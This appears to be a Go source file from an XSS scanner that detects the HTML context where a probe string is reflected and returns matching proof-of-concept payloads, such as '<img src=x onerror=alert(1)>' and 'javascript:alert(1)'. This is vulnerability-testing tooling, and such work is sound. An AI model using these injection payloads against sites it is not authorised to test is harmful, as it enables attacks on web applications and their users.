package scanner

import (
	"regexp"
	"strings"

	"github.com/lcalzada-xor/xxss/models"
)

// DetectContext analyzes the HTML around the probe to determine reflection context
func DetectContext(body, probe string) models.ReflectionContext {
	// Find first occurrence of probe
	index := strings.Index(body, probe)
	if index == -1 {
		return models.ContextUnknown
	}

	// Get surrounding context (500 chars before and after)
	start := max(0, index-500)
	end := min(len(body), index+len(probe)+500)
	context := body[start:end]

	// Check contexts in order of specificity
	if isInComment(context, probe) {
		return models.ContextComment
	}

	if isInJavaScript(context, probe) {
		return models.ContextJavaScript
	}

	if isInCSS(context, probe) {
		return models.ContextCSS
	}

	if isInURL(context, probe) {
		return models.ContextURL
	}

	if isInAttribute(context, probe) {
		return models.ContextAttribute
	}

	// Default to HTML
	return models.ContextHTML
}

func isInJavaScript(context, probe string) bool {
	// Check if inside <script> tags
	scriptPattern := regexp.MustCompile(`(?i)<script[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</script>`)
	if scriptPattern.MatchString(context) {
		return true
	}

	// Check for inline event handlers (onclick, onload, etc.)
	eventPattern := regexp.MustCompile(`(?i)on\w+\s*=\s*["'][^"']*` + regexp.QuoteMeta(probe))
	return eventPattern.MatchString(context)
}

func isInCSS(context, probe string) bool {
	// Check if inside <style> tags
	stylePattern := regexp.MustCompile(`(?i)<style[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</style>`)
	if stylePattern.MatchString(context) {
		return true
	}

	// Check for inline style attribute
	inlineStylePattern := regexp.MustCompile(`(?i)style\s*=\s*["'][^"']*` + regexp.QuoteMeta(probe))
	return inlineStylePattern.MatchString(context)
}

func isInAttribute(context, probe string) bool {
	// Check if inside HTML tag attribute value
	// Pattern: <tag attr="value with probe" or <tag attr='value with probe' or <tag attr=value
	attrPattern := regexp.MustCompile(`<[^>]*\s+\w+\s*=\s*["']?[^"'>]*` + regexp.QuoteMeta(probe))
	return attrPattern.MatchString(context)
}

func isInURL(context, probe string) bool {
	// Check if inside href, src, action, data attributes
	urlPattern := regexp.MustCompile(`(?i)(href|src|action|data|formaction)\s*=\s*["']?[^"'>]*` + regexp.QuoteMeta(probe))
	return urlPattern.MatchString(context)
}

func isInComment(context, probe string) bool {
	// Check if inside HTML comment
	commentPattern := regexp.MustCompile(`<!--[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?-->`)
	return commentPattern.MatchString(context)
}

// GetSuggestedPayload returns a context-specific XSS payload
func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) string {
	// Check which characters are available
	hasLt := contains(unfiltered, "<")
	hasGt := contains(unfiltered, ">")
	hasDquote := contains(unfiltered, "\"")
	hasSquote := contains(unfiltered, "'")
	hasQuote := hasDquote || hasSquote
	hasSpace := contains(unfiltered, " ")
	hasEquals := contains(unfiltered, "=")
	hasSlash := contains(unfiltered, "/")
	hasParen := contains(unfiltered, "(") && contains(unfiltered, ")")

	switch context {
	case models.ContextHTML:
		if hasLt && hasGt {
			if hasSpace && hasEquals {
				// XSS without quotes
				return "<img src=x onerror=alert(1)>"
			}
			if hasSlash {
				return "<script>alert(1)</script>"
			}
			return "<svg onload=alert(1)>"
		}

	case models.ContextJavaScript:
		if hasSquote {
			return "';alert(1);//"
		}
		if hasDquote {
			return "\";alert(1);//"
		}
		if hasParen {
			return ";alert(1);//"
		}

	case models.ContextAttribute:
		if hasQuote && hasSpace {
			quote := "'"
			if hasDquote {
				quote = "\""
			}
			return quote + " onload=" + quote + "alert(1)"
		}
		if hasGt && hasLt {
			return "><script>alert(1)</script>"
		}

	case models.ContextCSS:
		if hasParen {
			return "expression(alert(1))"
		}
		return "x:expression(alert(1))"

	case models.ContextURL:
		return "javascript:alert(1)"

	case models.ContextComment:
		if hasGt && hasLt {
			return "--><script>alert(1)</script><!--"
		}
	}

	return ""
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
